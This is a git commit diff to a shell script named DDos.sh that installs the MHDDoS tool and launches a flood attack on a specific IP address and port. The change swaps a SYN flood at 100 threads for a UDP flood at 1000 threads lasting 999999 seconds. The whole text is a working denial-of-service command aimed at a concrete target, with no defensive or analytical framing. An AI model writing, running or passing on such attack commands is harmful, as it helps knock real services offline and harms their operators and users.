ee87f652037b6877196676aa2b861edc18f1bffa
ChenSa <74320851+Chen-Sa@users.noreply.github.com>
2022-09-09 20:07:37 +0000

    Update DDos.sh

--- DDos.sh
+++ DDos.sh
@@ -4,4 +4,4 @@ curl -sSL https://bootstrap.pypa.io/get-pip.py -o get-pip.py
 sudo python3 get-pip.py
 cd MHDDoS/
 pip install -r requirements.txt
-sudo python3 start.py syn 80.96.156.22:443 100 999999 --debug
+sudo python3 start.py udp 80.96.156.22:443 1000 999999
